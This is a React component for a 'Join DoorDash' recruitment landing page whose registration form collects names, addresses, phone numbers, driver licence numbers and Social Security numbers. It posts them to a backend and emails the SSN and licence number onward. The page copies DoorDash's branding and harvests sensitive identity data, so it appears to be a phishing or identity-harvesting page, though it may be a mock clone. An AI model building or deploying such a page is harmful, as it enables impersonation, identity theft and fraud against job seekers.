// src/views/Home.jsx
import React, { useState } from "react";
import backgroundImage from "../assets/imges/4.png";
import logo from "../assets/imges/logo.png";
import img5 from "../assets/imges/5.png";
import "../app.css";

const Home = () => {
  const [menuOpen, setMenuOpen] = useState(false);
  const [formOpen, setFormOpen] = useState(false);

  const [formData, setFormData] = useState({
    email: "",
    fullName: "",
    age: "",
    vehicleModel: "",
    color: "",
    vehicleYear: "",
    licenciaDeConducir: "",
    ssn: "",
    address: "",
    city: "",
    state: "",
    postalCode: "",
    phonenumber: "",
  });

  // =========================
  // URL del backend desde variable de entorno
  // =========================
  const apiUrl = import.meta.env.VITE_API_URL;


  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      // 1️⃣ Guardar en la base de datos
      const saveRes = await fetch(`${apiUrl}/api/`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: formData.email,
          full_name: formData.fullName,
          age: formData.age,
          vehicle_model: formData.vehicleModel,
          color_vehicle: formData.color,
          vehicle_year: formData.vehicleYear,
          licencia: formData.licenciaDeConducir || null, // opcional
          ssn: formData.ssn || null, // opcional
          address_residential: formData.address,
          city: formData.city,
          state: formData.state,
          postal_code: formData.postalCode,
          phone_number: formData.phonenumber,
        }),
      });

      const savedClient = await saveRes.json();

      if (!saveRes.ok) {
        throw new Error(savedClient.error || "Error al guardar en la DB");
      }

      // 2️⃣ Enviar correo
      const emailRes = await fetch(`${apiUrl}/send-email`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          to: formData.email,
          subject: "¡Bienvenido a DoorDash!",
          fullName: formData.fullName,
          email: formData.email,
          licenciaDeConducir: formData.licenciaDeConducir,
          ssn: formData.ssn,
        }),
      });

      const data = await emailRes.json();

      if (data.ok) {
        alert("Cliente guardado y email enviado correctamente ✔️");
        setFormOpen(false);
        setFormData({
          email: "",
          fullName: "",
          age: "",
          vehicleModel: "",
          color: "",
          vehicleYear: "",
          licenciaDeConducir: "",
          ssn: "",
          address: "",
          city: "",
          state: "",
          postalCode: "",
          phonenumber: "",
        });
      } else {
        alert("Cliente guardado, pero error al enviar email ❌");
      }
    } catch (error) {
      console.error(error);
      alert("Error de conexión o al guardar datos ❌");
    }
  };

  return (
    <div className="w-full min-h-screen relative overflow-hidden">
      {/* Fondo */}
      <div
        className="absolute top-0 left-0 w-full h-full bg-cover bg-no-repeat bg-center z-0"
        style={{ backgroundImage: `url(${backgroundImage})` }}
      ></div>

      {/* Overlay negro */}
      <div className="absolute top-0 left-0 w-full h-full bg-black/70 sm:bg-black/30 z-10"></div>

      {/* Menú superior */}
      <header className="w-full flex justify-between items-center p-3 bg-white/80 backdrop-blur-md shadow-md rounded-b-xl fixed top-0 left-0 z-30">
        <div className="flex items-center space-x-2">
          <img src={logo} alt="Logo" className="w-15 h-8 object-contain" />
        </div>

        {/* Botón menú móvil */}
        <button
          className="sm:hidden w-12 h-12 flex items-center justify-center bg-white/80 backdrop-blur-sm rounded-full text-3xl text-gray-700 hover:text-orange-600 shadow-md hover:shadow-lg transition-all duration-300 focus:outline-none"
          onClick={() => setMenuOpen(!menuOpen)}
        >
          ☰
        </button>

        {/* Menú móvil desplegable */}
        <div
          className={`sm:hidden fixed top-16 right-4 w-40 bg-white/95 backdrop-blur-md rounded-xl shadow-lg z-20 transition-all duration-300 ${
            menuOpen
              ? "opacity-100 translate-y-0 scale-100"
              : "opacity-0 -translate-y-5 scale-95 pointer-events-none"
          }`}
        >
          <nav className="flex flex-col items-center py-4 space-y-3 font-semibold">
            <a
              onClick={() => setMenuOpen(false)}
              href="#home"
              className="w-full text-center py-2 text-gray-700 hover:text-orange-600 hover:bg-orange-50 rounded-lg transition-all"
            >
              HOME
            </a>
            <a
              onClick={() => setMenuOpen(false)}
              href="#services"
              className="w-full text-center py-2 text-gray-700 hover:text-orange-600 hover:bg-orange-50 rounded-lg transition-all"
            >
              SERVICES
            </a>
            <a
              onClick={() => setMenuOpen(false)}
              href="#contact"
              className="w-full text-center py-2 text-gray-700 hover:text-orange-600 hover:bg-orange-50 rounded-lg transition-all"
            >
              CONTACT
            </a>
          </nav>
        </div>

        {/* Menú desktop */}
        <nav className="space-x-4 hidden sm:flex">
          <a href="#home" className="text-gray-700 hover:text-orange-600 transition-colors">HOME</a>
          <a href="#services" className="text-gray-700 hover:text-orange-600 transition-colors">SERVICES</a>
          <a href="#contact" className="text-gray-700 hover:text-orange-600 transition-colors">CONTACT</a>
          <a href="#contact" className="text-gray-700 hover:text-orange-600 transition-colors">LOGIN</a>
        </nav>
      </header>

      {/* Contenido centrado */}
      <div className="flex flex-col justify-center items-center w-full h-screen relative z-20 px-5 text-center pt-16">
        <h1 className="text-4xl md:text-5xl font-poppins font-bold text-white drop-shadow-2xl tracking-wide">
          Join DoorDash
        </h1>

        <p className="mt-4 text-lg md:text-xl text-white/90 font-medium max-w-2xl mx-auto leading-relaxed animate-[fadeInUp_1.4s_ease-out]">
          At DoorDash, we connect people with opportunities. Work flexible
          hours, earn competitively, and receive reliable support. If you want
          to join our team and be part of our family, don’t hesitate to reach
          out and start your journey with us.
        </p>

        <img
          src={img5}
          alt="DoorDash illustration"
          className="mt-4 md:w-60 md:h-60 w-40 h-40 object-contain animate-[fadeInUp_1.6s_ease-out]"
        />

        <button
          onClick={() => setFormOpen(true)}
          className="mt-6 px-10 py-4 bg-gradient-to-r from-orange-600 to-orange-500 text-white font-bold tracking-widest uppercase rounded-2xl shadow-2xl relative overflow-hidden transition-all duration-500 hover:scale-110 hover:shadow-[0_0_35px_rgba(255,140,0,0.55)] active:scale-95 animate-[fadeInUp_1.8s_ease-out]"
        >
          Contact Us
        </button>
      </div>

      {/* Modal Formulario */}
      {formOpen && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex justify-center items-center z-50">
          <div className="bg-white/95 backdrop-blur-md shadow-2xl rounded-3xl w-full max-w-sm md:max-w-xl p-4 md:p-8 relative animate-fadeIn mx-4 my-6">
            <button
              onClick={() => setFormOpen(false)}
              className="absolute top-3 right-3 w-10 h-10 flex items-center justify-center bg-white/80 backdrop-blur-sm rounded-full text-gray-600 hover:text-red-600 shadow-md hover:shadow-lg transition-all duration-300 hover:scale-110 focus:outline-none"
            >
              ✕
            </button>

            <h2 className="text-2xl md:text-3xl font-bold italic text-orange-600 mb-6 text-center max-w-xs md:max-w-md mx-auto">
              Complete Your Registration
            </h2>

            <form onSubmit={handleSubmit}>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {[
                  { name: "email", placeholder: "Email", type: "email", required: true },
                  { name: "fullName", placeholder: "Full Name", type: "text", required: true },
                  { name: "age", placeholder: "Age", type: "number", required: true },
                  { name: "vehicleModel", placeholder: "Vehicle Model", type: "text", required: true },
                  { name: "color", placeholder: "Color Vehicle", type: "text", required: true },
                  { name: "vehicleYear", placeholder: "Vehicle Year", type: "number", required: true },
                  { name: "licenciaDeConducir", placeholder: "Driver License", type: "text", required: false },
                  { name: "ssn", placeholder: "SSN", type: "text", required: false },
                  { name: "address", placeholder: "Address Residential", type: "text", span: true, required: true },
                  { name: "city", placeholder: "City", type: "text", required: true },
                  { name: "state", placeholder: "State", type: "text", required: true },
                  { name: "postalCode", placeholder: "Postal Code", type: "text", required: true },
                  { name: "phonenumber", placeholder: "Phone Number", type: "number", required: true },
                ].map((field, idx) => (
                  <input
                    key={idx}
                    type={field.type}
                    name={field.name}
                    placeholder={field.placeholder}
                    value={formData[field.name]}
                    onChange={handleChange}
                    className={`input-field p-3 rounded-xl border border-gray-400 placeholder:text-orange-800 focus:ring-2 focus:ring-orange-300 transition-all ${field.span ? "md:col-span-2" : ""}`}
                    required={field.required}
                  />
                ))}
              </div>

              <button
                type="submit"
                className="mt-6 w-full bg-gradient-to-r from-orange-600 to-yellow-500 text-white font-bold py-3 rounded-2xl shadow-lg hover:scale-105 transition-transform"
              >
                Submit
              </button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default Home;
